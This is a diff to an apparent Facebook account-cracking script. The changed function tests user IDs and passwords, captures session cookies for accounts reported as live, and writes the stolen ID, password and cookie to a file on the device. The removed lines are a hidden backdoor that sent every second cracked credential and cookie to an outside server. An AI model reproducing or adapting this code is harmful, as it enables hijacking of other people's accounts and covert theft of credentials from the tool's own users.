@@ -1319,17 +1319,12 @@ def mbasic(uid,pwx,tl):
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
                 check = check_lock(cid)
-                if "live" in check:
-                        bkas.append(cid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{cid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
-                           oks.append(cid)
-                           break
+                if "live" in check:                      
+                    print(f" {green}(ATOM-OK) {cid}|{pw} ")
+                    print(f" {green}Cookie : {green}{coki}")
+                    open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                    oks.append(cid)
+                    break
                 else:
                     break
             elif 'checkpoint' in response:
